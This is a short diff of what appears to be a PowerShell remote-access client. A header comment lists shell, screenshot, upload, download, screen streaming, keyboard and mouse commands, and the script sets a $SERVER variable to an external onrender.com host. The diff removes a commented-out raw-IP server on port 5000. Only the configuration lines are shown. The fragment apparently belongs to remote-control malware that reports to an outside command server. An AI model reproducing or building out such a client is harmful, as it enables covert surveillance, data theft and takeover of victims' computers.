@@ -2,7 +2,6 @@
 # All commands: shell, screenshot, upload, download, stream, keyboard, mouse
 
 $SERVER = "https://cpp-2-hsyk.onrender.com"
-# $SERVER = "http://135.181.96.173:5000"
 $CLIENT_ID = $null
 $STREAMING = $false
 $STREAM_INTERVAL_MS = 42  # ~24 FPS
